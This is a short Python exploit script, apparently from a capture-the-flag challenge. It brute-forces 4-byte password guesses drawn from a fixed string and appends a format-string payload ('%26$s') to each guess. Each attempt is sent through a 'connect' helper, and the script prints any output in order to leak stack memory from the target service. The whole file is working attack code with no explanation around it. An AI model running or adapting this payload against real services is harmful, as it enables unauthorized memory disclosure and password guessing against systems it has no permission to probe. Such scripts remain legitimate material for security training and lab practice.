#! /usr/bin/python3
import connect


def main():
    len_pass = 4
    super_str = b"thiswordakedstactest"
    len_super = len(super_str)
    # Note the value at 26$ and 27$ won't be accessible, but that's ok as that should be the input buffer itself
    for i in range(0, len_super - len_pass + 1):
        guess = super_str[i: i + len_pass]
        print(guess)
        out = connect.connect(password=guess + b"%26$s")
        if len(out):
            print(guess, len(out), out)


if __name__ == '__main__':
    main()
